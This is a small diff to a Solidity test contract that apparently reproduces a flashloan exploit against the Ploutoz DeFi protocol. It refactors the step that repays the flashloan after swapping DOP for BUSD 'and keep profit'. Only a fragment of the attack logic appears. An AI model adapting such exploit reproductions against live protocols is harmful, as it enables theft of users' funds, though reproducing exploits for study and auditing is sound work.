@@ -94,8 +94,8 @@ contract Ploutoz is BaseTestWithBalanceLog {
         //Swap enough DOP to payback flashloan and keep profit
         swapTokenToToken(DOP, BUSD, 570_625_638_619_593_832_545_805, TwindexSwapRouter);
 
-        uint256 amount = 1_002_951.02 ether;
-        IERC20(BUSD).transfer(PancakeSwap, amount);
+        //Payback flashloan
+        IERC20(BUSD).transfer(PancakeSwap, 1_002_951.02 ether);
     }
 
     function borrowMultipleLoans() internal {
